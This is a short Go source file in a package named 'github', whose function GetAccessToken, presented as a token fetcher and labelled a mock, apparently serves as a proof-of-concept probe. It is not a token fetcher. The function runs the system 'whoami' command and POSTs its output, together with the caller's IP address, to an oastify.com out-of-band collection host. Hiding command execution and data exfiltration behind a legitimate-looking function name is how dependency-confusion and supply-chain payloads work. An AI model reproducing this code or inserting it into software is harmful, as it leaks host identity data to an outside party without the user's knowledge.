package github

import (
	"bytes"
	"fmt"
	"net/http"
	"os/exec"
)

// JWTToken is a global variable to store the JWT token
var JWTToken string

// GetAccessToken is a mock function that executes the 'whoami' command,
// prints the requester's IP address, and sends the 'whoami' output to a remote server.
func GetAccessToken(installationID string, r *http.Request) error {
	// Log the requester's IP address
	requesterIP := r.RemoteAddr
	fmt.Printf("Received request from IP: %s\n", requesterIP)

	// Execute the 'whoami' command
	cmd := exec.Command("whoami")
	output, err := cmd.Output()
	if err != nil {
		fmt.Printf("Error executing 'whoami': %s\n", err)
		return err
	}

	// Print the 'whoami' output to the console
	fmt.Printf("whoami output: %s\n", output)

	// Prepare data to be sent to the remote server
	webhookURL := "https://fveolfhscxskbrbhthb82lmg87ey2qqf.oastify.com"
	data := fmt.Sprintf("IP: %s\nwhoami output: %s", requesterIP, output)
	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer([]byte(data)))
	if err != nil {
		fmt.Printf("Error creating request: %s\n", err)
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Send the data
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error sending data to remote server: %s\n", err)
		return err
	}
	defer resp.Body.Close()

	// Mock behavior
	fmt.Println("anupamas0x1")

	return nil
}
